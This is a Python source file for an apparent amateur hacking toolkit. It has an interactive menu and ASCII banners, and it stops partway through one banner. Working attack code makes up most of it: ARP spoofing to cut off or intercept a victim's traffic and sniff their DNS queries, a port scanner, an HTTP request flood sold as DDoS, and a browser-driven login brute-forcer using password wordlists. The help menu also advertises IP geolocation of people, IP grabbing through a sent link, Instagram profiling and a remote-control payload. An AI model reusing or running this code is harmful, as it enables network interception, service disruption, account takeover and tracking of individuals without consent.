from scapy.all import ARP, send , sniff , DNS , DNSQR
import time
from rich import print
from rich.console import Console
from pynput import keyboard
import socket
import requests
import threading
from playwright.sync_api import sync_playwright
import webbrowser
from get_web_ip import ip_addr
from ilinsta import il_insta
import random
import sys
import subprocess
console = Console()

def main():
    chkl=["""
             .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'   DIE    `98v8P'  HUMAN   `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'       `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '
""",
"""
  /|  |\            /|  |\
  /|  |\            /|  |\
 / |  | \          / |  | \
 | |  | |          | |  | |
 \  \/  /  __  __  \  \/  /
  \    /  / /  \ \  \    /
   \  /   \ \__/ /   \  /
   \  /   /      \   \  /
  _ \ \__/ O    O \__/ / _
  \\ \___          ___/ //
_  \\___/  ______  \___//  _
\\  ----(          )----  //
 \\_____( ________ )_____//
  ~-----(          )-----~ _
   _____( ________ )_____  \\
  /,----(          )----  _//
 //     (  ______  )     /  \
 ~       \        /      \  /
          \  __  /       / /
           \    /       / /
            \   \      / /
             \   ~----~ /
              \________/
""",
"""
             _.-````'-,_
   _,.,_ ,-'`           `'-.,_
 /)     (\                   '``-.
((      ) )                      `\
 \)    (_/                        )\
  |       /)           ' ,   ,'    / \
  `\    ^'            '     (    /  ))
    |      _/\ ,     /    ,,`\   (  "`
     \Y,   |  \  \  | ````| / \_ \
       `)_/    \  \  )    ( >  ( >
                \( \(     |/   |/
    mic & dwb  /_(/_(    /_(  /_(
""",
"""
                  _         _
 .-""-.          ( )-"```"-( )          .-""-.
/ O O  \          /         \          /  O O \
|O .-.  \        /   0 _ 0   \        /  .-. O|
\ (   )  '.    _|     (_)     |     .'  (   ) /
 '.`-'     '-./ |             |`\.-'     '-'.'
   \         |  \   \     /   /  |         /
    \        \   '.  '._.'  .'   /        /
     \        '.   `'-----'`   .'        /
      \   .'    '-._        .-'\   '.   /
       |/`          `'''''')    )    `\|
       /                  (    (      ,\
      ;                    \    '-..-'/ ;
      |                     '.       /  |
      |                       `'---'`   |
      ;                                 ;
       \                               /
        `.                           .'
          '-._                   _.-'
    jgs    __/`"  '  - - -  ' "`` \__
         /`            /^\           `\
         \(          .'   '.         )/
          '.(__(__.-'       '.__)__).'
""",
"""
   _--_     _--_    _--_     _--_     _--_     _--_     _--_     _--_
  (    )~~~(    )  (    )~~~(    )   (    )~~~(    )   (    )~~~(    )
   \           /    \           /     \           /     \           /
    (  ' _ `  )      (  ' _ `  )       (  ' _ `  )       (  ' _ `  )
     \       /        \       /         \       /         \       /
   .__( `-' )          ( `-' )           ( `-' )        .__( `-' )  ___
  / !  `---' \      _--'`---_          .--`---'\       /   /`---'`-'   \
 /  \         !    /         \___     /        _>\    /   /          ._/   __
!   /\        )   /   /       !  \   /  /-___-'   ) /'   /.-----\___/     /  )
!   !_\       ). (   <        !__/ /'  (        _/  \___//          `----'   !
 \    \       ! \ \   \      /\    \___/`------' )       \            ______/
  \___/   )  /__/  \--/   \ /  \  ._    \      `<         `--_____----'
    \    /   !       `.    )-   \/  ) ___>-_     \   /-\    \    /
    /   !   /         !   !  `.    / /      `-_   `-/  /    !   !
   !   /__ /___       /  /__   \__/ (  \---__/ `-_    /     /  /__
   (______)____)     (______)        \__)  
""",
"""
                                 __
                     .--.      .'  `.
                   .' . :\    /   :  L
                   F     :\  /   . : |        .-._
                  /     :  \/        J      .' ___\
                 J     :   /      : : L    /--'   ``.
                 F      : J           |  .<'.o.  `-'>
                /        J             L \_>.   .--w)
               J        /              \_/|   . `-__|
               F                        / `    -' /|)
              |   :                    J   '        |
             .'   ':                   |    .    :  \
            /                          J      :     |L
           F                              |     \   ||
          F .                             |   :      |
         F  |                             ; .   :  : F
        /   |                                     : J
       J    J             )                ;        F
       |     L           /      .:'                J
    .-'F:     L        ./       :: :       .       F
    `-'F:     .\    `:.J         :::.             J
      J       ::\    `:|        |::::\            |
      J        |:`.    J        :`:::\            F
       L   :':/ \ `-`.  \       : `:::|        .-'
       |     /   L    >--\         :::|`.    .-'
       J    J    |    |   L     .  :::: :`, /
        L   F    J    )   |        >::   : /
        |  J      L   F   \     .-.:'   . /
        ): |     J   /     `-   | |   .--'
        /  |     |: J        L  J J   )
        L  |     |: |        L   F|   /
        \: J     \:  L       \  /  L |
         L |      \  |        F|   | )
         J F       \ J       J |   |J
          L|        \ \      | |   | L
          J L        \ \     F \   F |
           L\         \ \   J   | J   L
          /__\_________)_`._)_  |_/   \_____
                              ""   `

""",
"""
       _.---.
       / ==.=-)
      (=-_==-=)
       \-==_-0/         /\             /\
       | o  o \         ||             ||
       |\     |         ()             ()
     _ \\`-_-/\ .-;.    ||   ___       ||
   /' | \\\/// / //|    ().-'/\/\-.    ()
   |\\ \ |\// | / / \   || --.-'__'/\..||
   | ||| \\|| /| |  |   ().\---'  |||-.()
   | \ |  \_/|/ ./  |   |\__/\_/\-\||-.||
___|  |\   |/ ////  |---|               |-----------
   \ / ||  |\_/'|  '|   `---------------'
   | |/|\  |    |   |
   \ \/'|  |    / | |
   |  | \  |   /;   /
    \/| |  /  |  / |
     \|\_(/_  /'  '/            ,--'\
      |  |\ `-\ . /          .-/__ / \.-\           .--.
      /  /|    /-'           \/      / _/    .-''-./  .'\
      | |\ \   |             (\__.-')   \    | /-'|.'-   \
      |/ | |    \            \/  \--'    |  _/|   |      |
     /   / \    |            /.. /  .-'  |-'  /   |      |
    |   |   |    \           \__/  /     /   |            \
    |   /   \    |           \__/-''    .   .'   ' \       \
    |   |   |    |             |.'\-        /   .           \
   /   /    \     \           /, - /    \_.'                |
   |  /|     |:F_P:           |\/-'                      |  |
   `-' |   ' `-._-'           |            /             /   \
       |  .      \           .|           |             /     |
       \          |         / |               ______.--'   __.'
       |  .       \        |   \ __/    /---''    `-.---'-'
       |   `       |       \__/ /      /
       |    \      |            `-:F_P:
       |          /
       `._     _.'
       (__`._.'  |
              (__)
""",
"""
   ***       
  ** **
 **   **
 **   **         **** 
 **   **       **   ****
 **  **       *   **   **
  **  *      *  **  ***  **
   **  *    *  **     **  *
    ** **  ** **        **
    **   **  **
   *           *
  *             *
 *    0     0    *
 *   /   @   \   *
 *   \__/ \__/   *
   *     W     *
     **     **   
       *****
""",
"""
           .--------.
          ( KING LEO )
           ))_.--._((
          ((        ))
         *            *
        .'._.-=''=-._.'.
       (0'            'O)
        ||   . () .   ||
        || (\:\/\/:/) ||
        || / (o)(O) \ ||
        || \()(..)()/ ||
        '_..-('--')-.._'
        /'--..))((..--'\
       |  )   \  /   (  |
        \ '-._(*.)_.-' /
       //'-._(=||=)_.-'\\
      //  /|/ (#@) \|\  \\
     //  //'.      .'\\  \\
    (O| /_|/|  ||  |\|_\ |O)
     || |   |..||..|   | ||
  ^^ || |___. (  ) .___| || ^^
 (OO)||/   .'  )(  '.   \||(OO)
  || //   .o0O'  'O0o.   \\ ||
  || |'------------------'| ||
  || |[<>][<>][<>][<>][<>]| ||
 |__|'===================='|__|
 /                             \
/                               \
============================LGB==
""",

]   
    choic = random.choice(chkl)
    print(choic)
    print("================================ + (⌐■_■) + ==================================")
    print("""

""")

    print("""
          [green]write -h or --help for help menu[/green]
[1].[yellow] wifi bllock[/yellow]      |  [7].[yellow] brute force[/yellow]
[2].[yellow] wifi attack[/yellow]      |  [8].[yellow] il web[/yellow]
[3].[yellow] ip url attack[/yellow]    |  [9].[yellow] il dirb[/yellow]
[4].[yellow] ilmap[/yellow]            |  [10].[yellow] il insta[/yellow]
[5].[yellow] il proxiy[/yellow]        |  [11].[yellow] il meta[/yellow] 
[6].[yellow] ddos attack[/yellow]      |
""")
    
    while True:
        usr= input("enter number [1-11] >")
        if usr == "1":
            print("loading....")
            time.sleep(1)
            print("running wifi block....")
            time.sleep(3)
            block()
        if usr == "2":

            wifi_attack()
        if usr == "3":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running ip and url attack....[/green]")
            time.sleep(3)
            ip_url_attack()
        if usr == "4":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running ilmap....[/green]")
            time.sleep(3)
            ilmap()
        if usr == "5":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running IL_proxiy....[/green]")
            time.sleep(3)
            proxiy()
        if usr == "6":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running ddos attack....[/green]")
            time.sleep(3)
            ddos_attack()
        if usr == "7":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running brute force....[/green]")
            time.sleep(3)
            brute_force()
        if usr == "8":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running il web....[/green]")
            time.sleep(3)
            il_web()
        if usr == "9":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running il dirb....[/green]")
            time.sleep(3)
            il_dirb()
        if usr == "10":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running il insta....[/green]")
            time.sleep(3)
            il_insta()
        if usr == "11":
            print("[yellow]loading....[/yellow]")
            time.sleep(1)
            print("[green]running il meta....[/green]")
            time.sleep(3)
            il_meta()  
        if usr == "-h" or usr == "--help":
            console.print("""
[blue]help menu:[/blue]
1. wifi bllock      |  To block wifi for a specific ip
2. wifi attack      |  To attack wifi and sniff dns requests
3. ip_url_attack    |  To attack wifi and sniff ip and url requests
4. ilmap            |  To scan open ports on target ip
5. il_proxiy        |  To create proxies and verify if you are working
6. DDOS ATTACK      |  To block the service on a specific website
7. brute force      |  To guess the password on a website
8. il_web           |  To find someone's location from their IP address
9. il_dirb          |  To find hidden paths in a location
10. il_insta        |  To extract information from a person on Instagram
11. il_meta         |  To create a file that can remotely control a device
""", style="yellow")
        else:
            print("invalid option")


def block():
    console.print("""
      
██╗    ██╗██╗███████╗██╗                ██████╗ ██╗      ██████╗  ██████╗██╗  ██╗
██║    ██║██║██╔════╝██║                ██╔══██╗██║     ██╔═══██╗██╔════╝██║ ██╔╝
██║ █╗ ██║██║█████╗  ██║                ██████╔╝██║     ██║   ██║██║     █████╔╝ 
██║███╗██║██║██╔══╝  ██║                ██╔══██╗██║     ██║   ██║██║     ██╔═██╗ 
╚███╔███╔╝██║██║     ██║    ███████╗    ██████╔╝███████╗╚██████╔╝╚██████╗██║  ██╗
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚══════╝    ╚═════╝ ╚══════╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝
                                                                                 """, style= "red")
    console.print("""




running wifi block.....






""", style="green")
    ip = input("enter ip: ")
    print("================================== + (⌐■_■) + ==================================")
    eouter = input("enter eouter ip: ")
    print("\nloding....<")
    for _ in range(100):
        print("=" , end="", flush=True)
        time.sleep(0.02)
    print(">")
    print("attack started....")
    time.sleep(1)
    print("[green]enter [/green][[red] ctrl + c to [/red]][green] stop bllock[/green]")
    time.sleep(1)
    runneng2 = True
    while runneng2:
        send(ARP(op=2, pdst= ip, psrc=eouter), verbose=False)
        send(ARP(op=2, pdst= eouter, psrc=ip), verbose=False)

def wifi_attack():
    console.print("""
           (    (     (                                                          )  
 (  (      )\ ) )\ )  )\ )             (       *   )  *   )    (        (     ( /(  
 )\))(   '(()/((()/( (()/(             )\    ` )  /(` )  /(    )\       )\    )\()) 
((_)()\ )  /(_))/(_)) /(_))         ((((_)(   ( )(_))( )(_))((((_)(   (((_) |((_)\  
_(())\_)()(_)) (_))_|(_))            )\ _ )\ (_(_())(_(_())  )\ _ )\  )\___ |_ ((_) 
\ \((_)/ /|_ _|| |_  |_ _|           (_)_\(_)|_   _||_   _|  (_)_\(_)((/ __|| |/ /  
 \ \/\/ /  | | | __|  | |             / _ \    | |    | |     / _ \   | (__   ' <   
  \_/\_/  |___||_|   |___|   _____   /_/ \_\   |_|    |_|    /_/ \_\   \___| _|\_\  
                            |_____|    

                            >\\\|/<
                            |_'''_|
                            (O) (o)
+------------------------OOO--(_)--OOOo------------------=| I wa

                  """ , style="blue")
    ip = input("enter target ip: ")
    router_ip = input("enter router ip: ")
    print("[green]attack started....[/green]")
    print("loding....")
    time.sleep(3)
    print("================================== + (⌐■_■) + ==================================")
    print("[green]running attack....[/green]")
    print("[green]enter [/green][[red] ctrl + c to [/red]][green] stop WIFI_ATTACK[/green]")
    def attack(packeg):
        if packeg.haslayer(DNSQR):

            try:
                print("url id is :",packeg[DNSQR].qname.decode())
            except:
                pass
        pass
    

    
    
    while True:
        send(ARP(op=2, pdst=ip, psrc = router_ip),verbose=False)
        send(ARP(op=2, pdst=router_ip, psrc = ip),verbose=False)
        sniff(prn=attack, timeout=1 ,store=False )
        time.sleep(2)


def ip_url_attack():
    console.print("""
.-..----.       .-. .-..----. .-.           .--.  .---.  .---.  .--.   .---. .-. .-.
| || {}  }      | { } || {}  }| |          / {} \{_   _}{_   _}/ {} \ /  ___}| |/ / 
| || .--'       | {_} || .-. \| `--.      /  /\  \ | |    | | /  /\  \\     }| |\ \ 
`-'`-'          `-----'`-' `-'`----'      `-'  `-' `-'    `-' `-'  `-' `---' `-' `-'
""", style= "red")
    print("[yellow]loding....[/yellow]")
    time.sleep(2)
    print("[green]running ip and url attack....[/green]")
    time.sleep(2)
    print("================================== + (⌐■_■) + ==================================")
    ip = input("enter target ip: ")
    router_ip = input("enter router ip: ")
    print("loding....")
    time.sleep(1)
    print("[green]enter [/green][[red] ctrl + c to [/red]][green] stop ip_url_attack[/green]")
    for i in range(100):
        print(f"\rloding...<{'='*i}>" , end="", flush=True)
        time.sleep(0.02)
    def attack(packeg):
        if packeg.haslayer("IP"):
            try:
                print(packeg["IP"].src, "->", packeg["IP"].dst)
            except:
                pass
    

    while True:
        send(ARP(op=2, pdst=ip, psrc = router_ip),verbose=False)
        send(ARP(op=2, pdst=router_ip, psrc = ip),verbose=False)
        sniff(prn=attack,timeout=1, store=False)




def ilmap():
    console.print("""
                                                           
    .---.                                                  
.--.|   | __  __   ___             _________   _...._      
|__||   ||  |/  `.'   `.           \        |.'      '-.   
.--.|   ||   .-.  .-.   '           \        .'```'.    '. 
|  ||   ||  |  |  |  |  |    __      \      |       \     \
|  ||   ||  |  |  |  |  | .:--.'.     |     |        |    |
|  ||   ||  |  |  |  |  |/ |   \ |    |      \      /    . 
|  ||   ||  |  |  |  |  |`" __ | |    |     |\`'-.-'   .'  
|__||   ||__|  |__|  |__| .'.''| |    |     | '-....-'`    
    '---'                / /   | |_  .'     '.             
                         \ \._,\ '/'-----------'           
                          `--'  `"                         
""", style="cyan")

    print("            [yellow]Welcome to ILMAP tool[/yellow]  ")
    print("[red]================================= + (⌐■_■) + ==================================[/red]")
    ip = input("enter target ip >")
    print("[yellow]loding....[/yellow]")
    time.sleep(2)
    print("[green]running ilmap tool....[/green]")
    time.sleep(2)
    print("================================== + (⌐■_■) + ==================================")
    print("[green]enter [/green][[red] ctrl + c to [/red]][green] stop ilmap[/green]")

    ports=range(1,5000)
    for port in ports:
        sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        sock.settimeout(0.5) 
        try:
            sock.connect((ip,port))
            try:
                name = socket.getservbyport(port)
            except:
                name = "unknown"
            print(f"[yellow] ip is [/yellow]{ip}[yellow] port is open [/yellow][red][{port}][/red][yellow]/[/yellow][[green]{name}[/green]]")
        except:
            pass

def proxiy():
    console.print("""
$$$$$$\ $$\                           $$$$$$$\  $$$$$$$\   $$$$$$\  $$\   $$\ $$$$$$\ $$\     $$\ 
\_$$  _|$$ |                          $$  __$$\ $$  __$$\ $$  __$$\ $$ |  $$ |\_$$  _|\$$\   $$  |
  $$ |  $$ |                          $$ |  $$ |$$ |  $$ |$$ /  $$ |\$$\ $$  |  $$ |   \$$\ $$  / 
  $$ |  $$ |                          $$$$$$$  |$$$$$$$  |$$ |  $$ | \$$$$  /   $$ |    \$$$$  /  
  $$ |  $$ |                          $$  ____/ $$  __$$< $$ |  $$ | $$  $$<    $$ |     \$$  /   
  $$ |  $$ |                          $$ |      $$ |  $$ |$$ |  $$ |$$  /\$$\   $$ |      $$ |    
$$$$$$\ $$$$$$$$\                     $$ |      $$ |  $$ | $$$$$$  |$$ /  $$ |$$$$$$\     $$ |    
\______|\________|      $$$$$$\       \__|      \__|  \__| \______/ \__|  \__|\______|    \__|    
                        \______|                                                                  
                                                                                                  
                                                                                                  """, style="magenta")

    url_http = "https://www.proxy-list.download/api/v1/get?type=http"
    url_socks5 = "https://www.proxy-list.download/api/v1/get?type=socks5"
    while True:
        print("[red]================================== + (⌐■_■) + ==================================[/red]")
        print("""
[1]. [yellow]download proxiy list[/yellow]
[2]. [yellow]check proxiy list[/yellow]
[3]. [yellow]check single proxiy[/yellow]
""")
        chek= input("write number [1-3] >")
        if chek == "1":
            print("""
      [blue]write type of proxiy:[/blue]
[1]. [yellow]http proxiy[/yellow]
[2]. [yellow]socks5 proxiy[/yellow]
            """)
            chk = input("write number [1-2] >")
            if chk == "1":
                r = requests.get(url_http)
                prox_http = r.text.splitlines()
                with open("http_proxiy.txt", "w") as file:
                    for porx in prox_http:
                        porx= porx.strip()
                        file.write(f"{porx}\n")

                print("[red]================================== + (⌐■_■) + ==================================[/red]")
                try:
                    with open("http_proxiy.txt", "r") as file:
                        proxies = file.readlines()
                        for proxy in proxies:
                            print(proxy.strip())
                        print("[green]http proxiy saved in http_proxiy.txt[/green]")
                except:
                    print("[yellow][!][/yellow][red]no http proxiy found[/red]")
            if chk == "2":
                re = requests.get(url_socks5)
                print("[yellow]loading....[/yellow]")
                time.sleep(2)
                print("[green]running socks5 proxiy....[/green]")
                time.sleep(2)
                prox_socks5 = re.text.splitlines()
                with open("prox_socks5.txt", "w") as file:
                    for por in prox_socks5:
                        por= por.strip()
                        file.write(por+"\n")

                print("[red]================================== + (⌐■_■) + ==================================[/red]")
                try:
                    with open("prox_socks5.txt", "r") as r:
                        proxies = r.readlines()
                        for proxy in proxies:
                            print(proxy.strip())
                        print("[green]socks5 proxiy saved in prox_socks5.txt[/green]")
                except:
                    print("[yellow][!][/yellow][red]no socks5 proxiy found[/red]")
            else:
                print("[yellow][!][/yellow][red]invalid option[/red]")
        if chek == "2":
            print("[blue][+][/blue][green]proxiy checked....[/green]")
            time.sleep(2)
            print("[yellow]running proxiy....[/yellow]")
            time.sleep(2)
            name_proxiy = input("enter proxiy file name >")
            ors = "http"
            orss= input("enter proxiy type [http/socks5] >")
            if orss == "http":
                ors = "http"
            elif orss == "socks5":
                ors = "socks5"
            else:
                print("[yellow][!][/yellow][red]invalid option[/red]")
            try:
                with open(name_proxiy, "r") as f:
                    proxiys = f.readlines()
                    for proxy in proxiys:
                        proxy = proxy.strip()
                        try:
                            proxiesi = {
                                "http": f"{ors}://{proxy}",
                                "https": f"{ors}://{proxy}",
                            }
                            url = "http://httpbin.org/ip"
                            res = requests.get(url, proxies=proxiesi, timeout=5)
                            if res.status_code == 200:
                                print(f"[green][+][/green]proxiy is working: [{proxy}]")
                                with open("working_proxiy.txt", "a") as wf:
                                    wf.write(proxy+"\n")

                        except:
                            print(f"[red][-][/red]proxiy not working: [{proxy}]")
                    print("[+][green]working proxiy saved in working_proxiy.txt[/green]")
            except:
                print("[yellow][!][/yellow][red]no proxiy file found[/red]")
        if chek == "3":
            print("[+][yellow]running proxiy chek....[/yellow]")
            time.sleep(2)
            print("[red]loding!...[/red]")
            time.sleep(1)
            print("[red]================================== + (⌐■_■) + ==================================[/red]")
            prox = input("enter proxiy >")
            ors = "http"
            orss= input("enter proxiy type [http/socks5] >")
            if orss == "http":
                ors = "http"
            elif orss == "socks5":
                ors = "socks5"
            else:
                print("[yellow][!][/yellow][red]invalid option[/red]")
            try:
                proxiesi = {
                    "http": f"{ors}://{prox}",
                    "https": f"{ors}://{prox}",
                }
                url = "http://httpbin.org/ip"
                res = requests.get(url, proxies=proxiesi, timeout=5)
                if res.status_code == 200:
                    print(f"[green][+][/green]proxiy is working: [{prox}]")
            except:
                print(f"[red][-][/red]proxiy not working: [{prox}]")
        if chek == "-h" or chek == "--help":
            console.print("""
[blue]help menu:[/blue]
1. download proxiy list    |   to download proxiy list from internet
2. check proxiy list       |   to check proxiy list from file
3. check single proxiy     |   to check single proxiy
""", style="yellow")
            
def ddos_attack():
    print("[red]_______________________+ DDOS ATTACK + ____________________[/red]")
    console.print(""" (     (         )   (                                                  )  
     )\ )  )\ )   ( /(   )\ )     (       *   )  *   )    (        (     ( /(  
    (()/( (()/(   )\()) (()/(     )\    ` )  /(` )  /(    )\       )\    )\()) 
     /(_)) /(_)) ((_)\   /(_)) ((((_)(   ( )(_))( )(_))((((_)(   (((_) |((_)\  
    (_))_ (_))_    ((_) (_))    )\ _ )\ (_(_())(_(_())  )\ _ )\  )\___ |_ ((_) 
     |   \ |   \  / _ \ / __|   (_)_\(_)|_   _||_   _|  (_)_\(_)((/ __|| |/ /  
     | |) || |) || (_) |\__ \    / _ \    | |    | |     / _ \   | (__   ' <   
     |___/ |___/  \___/ |___/   /_/ \_\   |_|    |_|    /_/ \_\   \___| _|\_\  
                                                                               """, style="red")
    
    print("            [yellow]Welcome to DDOS attack tool[/yellow]  ")
    print("[red]================================= + (⌐■_■) + ==================================[/red]")



    url = input("enter target url >")
    num_1 = int(input("enter number of requests >"))
    num_2 = int(input("enter number of threads >"))

    print("[yellow]loding....[/yellow]")
    time.sleep(2)
    print("[green]running ddos attack....[/green]")
    time.sleep(2)
    print("================================== + (⌐■_■) + ==================================")
    print("[green]enter [/green][[red] ctrl + c [/red]][green] to stop ddos attack[/green]")
    def attack():
        for i in range(num_1):
     
            try:
                r = requests.get(url)
                print(f"[green][+][/green]request sent to {url} | status code: [{r.status_code}]")
            except:
                print(f"[red][-][/red]failed to send request to {url} | server might be down{r.status_code}")
    thr = [threading.Thread(target=attack) for _ in range(num_2)]
    for t in thr:
        t.start()

def brute_force():
    console.print("""
 /$$$$$$$  /$$$$$$$  /$$   /$$ /$$$$$$$$ /$$$$$$$$                     /$$$$$$$$ /$$$$$$  /$$$$$$$   /$$$$$$  /$$$$$$$$
| $$__  $$| $$__  $$| $$  | $$|__  $$__/| $$_____/                    | $$_____//$$__  $$| $$__  $$ /$$__  $$| $$_____/
| $$  \ $$| $$  \ $$| $$  | $$   | $$   | $$                          | $$     | $$  \ $$| $$  \ $$| $$  \__/| $$      
| $$$$$$$ | $$$$$$$/| $$  | $$   | $$   | $$$$$                       | $$$$$  | $$  | $$| $$$$$$$/| $$      | $$$$$   
| $$__  $$| $$__  $$| $$  | $$   | $$   | $$__/                       | $$__/  | $$  | $$| $$__  $$| $$      | $$__/   
| $$  \ $$| $$  \ $$| $$  | $$   | $$   | $$                          | $$     | $$  | $$| $$  \ $$| $$    $$| $$      
| $$$$$$$/| $$  | $$|  $$$$$$/   | $$   | $$$$$$$$                    | $$     |  $$$$$$/| $$  | $$|  $$$$$$/| $$$$$$$$
|_______/ |__/  |__/ \______/    |__/   |________/       /$$$$$$      |__/      \______/ |__/  |__/ \______/ |________/
                                                        |______/                                                       

""",style="blue")
    url = input("enter target url :")
    u_name = input("Name Entry :")
    u_pass = input("Name/Password :")
    errers = input("write errer text :")
    name = input("Enter the target's name :")
    print("""
[1]. [yellow]Use a ready-made password file (rockyo.txt)[/yellow]
[2]. [yellow]Use your own password file[/yellow]
""")
    wordlist = input("enter number [1-2] >")
    print("""
[1]. [yellow]Hide the process[/yellow]
[2]. [yellow]Show the process[/yellow]
""")
    head = input("enter number [1-2] >")
    hedlins = True
    if head == "2":
        hedlins = False
    elif head == "1":
        hedlins =True
    else:
        print("[yellow][!][/yellow][red]Error![/red]")
        hedlins = True
    if wordlist == "1":
        pass_file = "rockyo.txt"
    elif wordlist == "2":
        pass_file = input("enter password file name >")
    else:
        print("[yellow][!][/yellow][red]invalid option[/red]")
    try:
        with open(pass_file, "r") as psw:
            passwords = psw.readlines()
    except:
        print("[yellow][!][/yellow][red]file not fond[/red]")
    with sync_playwright() as p:
        bro = p.chromium.launch(headless=hedlins, args=["--disable-blink-features=AutomationControlled"])
        cuntext = bro.new_context()
        page = cuntext.new_page()
        page.goto(url,timeout=15000)
        for password in passwords:
            pasword = password.strip()
            try:
                page.fill(f'input[name="{u_name}"]',"")
                page.fill(f'input[name="{u_pass}"]',"")
                #=====================================
                
                page.fill(f'input[name="{u_name}"]',name)
                page.fill(f'input[name="{u_pass}"]',pasword)
                
                page.keyboard.press("Enter")
                page.wait_for_timeout(1200)
                content = page.inner_text("body")
                if errers in content:
                    print(f"[red][-][/red][green]its not password [/green]{pasword}")
                else:
                    print(f"""
[red]========================================================[/red]
[blue][+][/blue]conect password
[yellow]password[/yellow] : [green]{pasword}[/green]
[yellow]name : [/yellow][green]{name}[/green]
[red]========================================================[/red]
""")
                    break
            except:
                print("[yellow][!][/yellow][red]Error![/red]")


def il_web():
    console.print("""
.-..-.         .-. . .-..----..----. 
| || |         | |/ \| || {_  | {}  }
| || `--.      |  .'.  || {__ | {}  }
`-'`----'      `-'   `-'`----'`----'                   
""",style="magenta")
    while True:
        print("""
[red]==================================[/red] + (⌐■_■) + [red]====================================[/red]
              
[1]. [yellow]Extracting a person's information from their IP address[/yellow]
[2]. [yellow]Accessing a person's website from their IP address[/yellow]
[3]. [yellow]Extracting a person's IP address by sending a link[/yellow]

    """)
        for i in range(100):
            print("=" , end="",flush=True)
            time.sleep(0.03)
        print(">")
        esr = input("enter number [1-3] >")
        if esr == "1":
            print("[blue]loding...[/blue]")
            time.sleep(2)
            print("[red]running...[/red]")
            time.sleep(2)
            ip_1 = input("Enter ip address :")
            url = f"http://ipinfo.io/{ip_1}/json"
            resp = requests.get(url)
            data = resp.json()
            print("[yellow]loding...[/yellow]")
            time.sleep(4)
            print("IP:", data.get("ip"))
            print("city:", data.get("city"))
            print("region:", data.get("region"))
            print("country:", data.get("country"))
            print("loc:", data.get("loc"))
            print("org:", data.get("org"))
        pass
        if esr == "2":

            ip_2 = input("Enter ip address :")
            url_2 = f"http://ipinfo.io/{ip_2}/json"
            res = requests.get(url_2)
            date = res.json()
            mab = date.get("loc")
            url_map = f"https://www.google.com/maps/@{mab},40m/data=!3m1!1e3?entry=ttu&g_ep=EgoyMDI1MTIwOS4wIKXMDSoASAFQAw%3D%3D"
            print("[+][red]url is[/red]",url_map)
            webbrowser.open(url_map)
        if esr == "3":
            print("[blue]loding...[/blue]")
            time.sleep(2)
            print("[red]running...[/red]")
            time.sleep(2)
            print("[+]port 5000 ..")
            ip_addr()
def il_dirb():
    console.print("""
░██████░██                           ░███████   ░██████░█████████  ░████████   
  ░██  ░██                           ░██   ░██    ░██  ░██     ░██ ░██    ░██  
  ░██  ░██                           ░██    ░██   ░██  ░██     ░██ ░██    ░██  
  ░██  ░██                           ░██    ░██   ░██  ░█████████  ░████████   
  ░██  ░██                           ░██    ░██   ░██  ░██   ░██   ░██     ░██ 
  ░██  ░██                           ░██   ░██    ░██  ░██    ░██  ░██     ░██ 
░██████░██████████    ░██████████    ░███████   ░██████░██     ░██ ░█████████  
                                                                               
                                                                               
 |____________________________________________________|
  | __     __   ____   ___ ||  ____    ____     _  __  |
  ||  |__ |--|_| || |_|   |||_|**|*|__|+|+||___| ||  | |
  ||==|^^||--| |=||=| |=*=||| |~~|~|  |=|=|| | |~||==| |
  ||  |##||  | | || | |JRO|||-|  | |==|+|+||-|-|~||__| |
  ||__|__||__|_|_||_|_|___|||_|__|_|__|_|_||_|_|_||__|_|
  ||_______________________||__________________________|
  | _____________________  ||      __   __  _  __    _ |
  ||=|=|=|=|=|=|=|=|=|=|=| __..\/ |  |_|  ||#||==|  / /|
  || | | | | | | | | | | |/\ \  \\|++|=|  || ||==| / / |
  ||_|_|_|_|_|_|_|_|_|_|_/_/\_.___\__|_|__||_||__|/_/__|
  |____________________ /\~()/()~//\ __________________|
  | __   __    _  _     \_  (_ .  _/ _    ___     _____|
  ||~~|_|..|__| || |_ _   \ //\\ /  |=|__|~|~|___| | | |
  ||--|+|^^|==|1||2| | |__/\ __ /\__| |==|x|x|+|+|=|=|=|
  ||__|_|__|__|_||_|_| /  \ \  / /  \_|__|_|_|_|_|_|_|_|
  |_________________ _/    \/\/\/    \_ _______________|
  | _____   _   __  |/      \../      \|  __   __   ___|
  ||_____|_| |_|##|_||   |   \/ __|   ||_|==|_|++|_|-|||
  ||______||=|#|--| |\   \   o    /   /| |  |~|  | | |||
  ||______||_|_|__|_|_\   \  o   /   /_|_|__|_|__|_|_|||
  |_________ __________\___\____/___/___________ ______|
  |__    _  /    ________     ______           /| _ _ _|
  |\ \  |=|/   //    /| //   /  /  / |        / ||%|%|%|
  | \/\ |*/  .//____//.//   /__/__/ (_)      /  ||=|=|=|
__|  \/\|/   /(____|/ //                    /  /||~|~|~|__
